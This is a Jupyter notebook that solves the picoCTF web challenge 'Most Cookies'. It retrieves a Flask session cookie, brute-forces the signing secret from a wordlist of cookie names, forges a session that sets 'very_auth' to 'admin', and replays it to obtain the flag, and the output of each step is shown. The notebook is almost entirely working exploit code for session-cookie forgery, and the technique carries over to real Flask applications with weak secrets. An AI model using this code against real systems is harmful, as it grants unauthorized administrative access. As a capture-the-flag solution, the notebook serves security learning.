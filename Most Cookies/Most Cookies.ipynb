{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "right-minimum",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from IPython.display import HTML\n",
    "import zlib\n",
    "from flask.sessions import SecureCookieSessionInterface\n",
    "from itsdangerous import base64_decode, URLSafeTimedSerializer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "solid-stock",
   "metadata": {},
   "outputs": [],
   "source": [
    "#https://qiita.com/koki-sato/items/6ff94197cf96d50b5d8f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "secure-webcam",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://mercury.picoctf.net:52134\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "egyptian-light",
   "metadata": {},
   "outputs": [],
   "source": [
    "cookie_names = [\"snickerdoodle\", \"chocolate chip\", \"oatmeal raisin\", \"gingersnap\", \"shortbread\", \"peanut butter\", \"whoopie pie\", \"sugar\", \"molasses\", \"kiss\", \"biscotti\", \"butter\", \"spritz\", \"snowball\", \"drop\", \"thumbprint\", \"pinwheel\", \"wafer\", \"macaroon\", \"fortune\", \"crinkle\", \"icebox\", \"gingerbread\", \"tassie\", \"lebkuchen\", \"macaron\", \"black and white\", \"white chocolate macadamia\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "transparent-iceland",
   "metadata": {},
   "outputs": [],
   "source": [
    "class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):\n",
    "    # NOTE: Override method\n",
    "    def get_signing_serializer(self, secret_key):\n",
    "        signer_kwargs = {\n",
    "            'key_derivation': self.key_derivation,\n",
    "            'digest_method': self.digest_method\n",
    "        }\n",
    "        return URLSafeTimedSerializer(\n",
    "            secret_key,\n",
    "            salt=self.salt,\n",
    "            serializer=self.serializer,\n",
    "            signer_kwargs=signer_kwargs\n",
    "        )\n",
    "\n",
    "\n",
    "class FlaskSessionCookieManager:\n",
    "    @classmethod\n",
    "    def decode(cls, secret_key, cookie):\n",
    "        sscsi = SimpleSecureCookieSessionInterface()\n",
    "        signingSerializer = sscsi.get_signing_serializer(secret_key)\n",
    "        return signingSerializer.loads(cookie)\n",
    "\n",
    "    @classmethod\n",
    "    def encode(cls, secret_key, session):\n",
    "        sscsi = SimpleSecureCookieSessionInterface()\n",
    "        signingSerializer = sscsi.get_signing_serializer(secret_key)\n",
    "        return signingSerializer.dumps(session)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "geological-understanding",
   "metadata": {},
   "outputs": [],
   "source": [
    "with requests.Session() as s:\n",
    "    page = s.get(url)\n",
    "    cookie = s.cookies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "streaming-constant",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YFcInA.AI3WPo_oTQIDwaNIH8tG6wm6_hw']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cookie.values()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "wicked-sender",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'very_auth': 'blank'}\n"
     ]
    }
   ],
   "source": [
    "for cookie_name in cookie_names:\n",
    "    try:\n",
    "        print(FlaskSessionCookieManager.decode(cookie_name, cookie.values()[0]))\n",
    "        break\n",
    "    except:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "excited-calvin",
   "metadata": {},
   "outputs": [],
   "source": [
    "session = {'very_auth': 'admin'}\n",
    "new_cookie = FlaskSessionCookieManager.encode(cookie_name, session)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "inappropriate-butter",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "<html lang=\"en\">\n",
       "\n",
       "<head>\n",
       "    <title>Most Cookies</title>\n",
       "\n",
       "\n",
       "    <link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\" rel=\"stylesheet\">\n",
       "\n",
       "    <link href=\"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\" rel=\"stylesheet\">\n",
       "\n",
       "    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n",
       "\n",
       "    <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n",
       "\n",
       "</head>\n",
       "\n",
       "<body>\n",
       "\n",
       "    <div class=\"container\">\n",
       "        <div class=\"header\">\n",
       "            <nav>\n",
       "                <ul class=\"nav nav-pills pull-right\">\n",
       "                    <li role=\"presentation\"><a href=\"/reset\" class=\"btn btn-link pull-right\">Reset</a>\n",
       "                    </li>\n",
       "                </ul>\n",
       "            </nav>\n",
       "            <h3 class=\"text-muted\">Most Cookies</h3>\n",
       "        </div>\n",
       "\n",
       "        <div class=\"jumbotron\">\n",
       "            <p class=\"lead\"></p>\n",
       "            <p style=\"text-align:center; font-size:30px;\"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>\n",
       "        </div>\n",
       "\n",
       "\n",
       "        <footer class=\"footer\">\n",
       "            <p>&copy; PicoCTF</p>\n",
       "        </footer>\n",
       "\n",
       "    </div>\n",
       "</body>\n",
       "\n",
       "</html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with requests.Session() as s:\n",
    "    s.cookies.update({\"session\":new_cookie})\n",
    "    page = s.get(url)\n",
    "HTML(page.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
